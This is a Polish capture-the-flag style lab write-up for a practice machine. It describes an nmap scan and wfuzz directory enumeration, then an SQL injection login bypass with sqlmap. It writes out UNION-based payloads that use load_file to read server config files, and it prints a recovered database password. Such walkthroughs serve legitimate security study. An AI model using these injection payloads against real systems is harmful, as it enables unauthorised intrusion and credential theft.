# ZTPPt

## Utworzenie połączenia z maszyną
Pobrany został plik konfiguracyjny OpenVPN na maszynę wirtualną z zainstalowanym systemem Kali Linux. Komenda do wywołania połaczenia VPN:
```
sudo openvpn lab.vpn
```

## Przebieg laboratorium
* Pierwszym krokiem było wykorzystanie oprogramowania nmap w celu rekonensanu aktywnego, użyto w tym celu komendy:
```
sudo nmap -sS -sV -sC <ip_address>
- sS - TCP SYN skan
- sV - sprawdzenie możliwosci występowania wersji oprogramowania na otwartym porcie
- sC - wykonanie podstawowych skryptów
```
Wynik skanowania

![Wynik skanowania](https://user-images.githubusercontent.com/52716721/141511219-992c3762-5266-45f4-82fd-62ae04e1c934.png)

* Biorąc pod uwagę otwarty port 80 oraz tytuł odpowiedzi z serwera HTTP, kolejne kroki będą prowadzone na stronie WWW, prezentującej się następująco
![Stronawww](https://user-images.githubusercontent.com/52716721/141511808-81ba4197-1cfd-4d19-9234-3433a15dec20.png)

* W celu znalezienia interesujących podstron, wykorzystane zostało wbudowane narzędzie wfuzz z atakiem słownikowym:
```
wfuzz -w /usr/share/wfuzz/wordlist/general/megabeast.txt -u http://10.10.11.101/FUZZ --hc 404
- w - ścieżka do słownika z podstronami
- u - adres strony z dodatkiem FUZZ w celu skanowania
- hc 404 - pominięcie podstron z odpowiedzią 404
```
Wynik skanowania wfuzz

![wfuzz](https://user-images.githubusercontent.com/52716721/141513351-5ff7381f-e698-43fc-89c7-81208a4f3e6c.png)

* Na stronie dostępny jest panel logowania administratora, pierwszym krokiem zostało sprawdzenie czy zadziała SQLi w tym celu użyto w polu loginu frazy `username ' or '1'='1`. Logowanie powiodło się, następnie wykorzystano sqlmap w celu sprawdzenia jaka jest skonfigurowana baza danych i użyto danych z formularza do logowania `uname=username'+or+'1'='1&password=test`.
Wynik prezentuje się następująco:

![image](https://user-images.githubusercontent.com/52716721/143478884-83138642-c297-49ad-b8b9-b0a13311ad73.png)

![image](https://user-images.githubusercontent.com/52716721/141533062-d4f0b4b6-4639-486f-bd20-947c012012d5.png)
![image](https://user-images.githubusercontent.com/52716721/141533167-0eb874b8-da4b-470f-af05-8a3f6688f1bd.png)
![image](https://user-images.githubusercontent.com/52716721/141533938-7c74d7bb-2572-46cb-9c1b-6d3e69b38044.png)
![image](https://user-images.githubusercontent.com/52716721/143478354-b7a9d660-18e8-4735-8002-3e3601dabfc1.png)
uname=username' UNION ALL SELECT NULL,load_file("/etc/apache2/sites-enabled/000-default.conf"),NULL,NULL,NULL,NULL-- -&password=test
uname=username' UNION ALL SELECT NULL,load_file("/var/www/writer.htb/writer.wsgi"),NULL,NULL,NULL,NULL-- -&password=test
![image](https://user-images.githubusercontent.com/52716721/143478809-566682a5-ca8f-4eb5-a72b-a2b08fc40f60.png)
![image](https://user-images.githubusercontent.com/52716721/143479464-bab8af2c-5c28-4e29-bc21-90d08b245957.png)
![image](https://user-images.githubusercontent.com/52716721/143479566-63bc8a3a-1baa-404d-bb12-aa454b7ced0a.png)
connector = mysql.connector.connect(user=&#39;admin&#39;, password=&#39;ToughPasswordToCrack&#39;, host=&#39;127.0.0.1&#39;, database=&#39;writer&#39;)
![image](https://user-images.githubusercontent.com/52716721/143593570-4da314d9-aa10-49db-b95c-724f8ad3a44f.png)
![image](https://user-images.githubusercontent.com/52716721/143593639-a6682460-2692-498d-8c02-b000b1827bf3.png)
![image](https://user-images.githubusercontent.com/52716721/143597265-0dc3a738-8d06-4216-8612-f284a6a84b5a.png)
![image](https://user-images.githubusercontent.com/52716721/143599339-fb5de575-7cf1-4538-8bd8-96eab3fa917c.png)








